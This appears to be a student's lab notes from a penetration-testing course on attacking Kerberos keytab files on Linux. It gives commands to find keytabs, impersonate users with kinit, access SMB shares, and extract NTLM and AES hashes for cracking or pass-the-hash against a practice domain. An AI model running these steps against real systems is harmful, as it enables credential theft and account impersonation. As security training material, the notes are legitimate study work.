## Finding Keytab Files
```shell-session
find / -name *keytab* -ls 2>/dev/null
```
can also check the cronjob to see if there are any jobs that require the keytab
```
crontab -l
```
then if we still something like `kinit`
```
kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
```
the .kt file here is the keytab ?

# Impersonate users
using keytab 
```
klist -k -t /opt/specialfiles/carlos.keytab 
```
allows us to find more information about the keytab (users, domain etc)
```
kinit name@domain -k -t /path/to/keytab
klist //to see what user we r now
```
connecting to smbclient 
```
smbclient //dc01/name -k -c ls
```

# Extracting credentials from keytab
[KeyTabExtract](https://github.com/sosdave/KeyTabExtract), a tool to extract valuable information from 502-type .keytab files
```
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 
```
then we can get the ntlm hash -> perform [[Pass the Hash (PtH)]] / crack with hashcat /johnnie
AES256/AES128 -> crack hashes to obtain plaintext password
or https://crackstation.net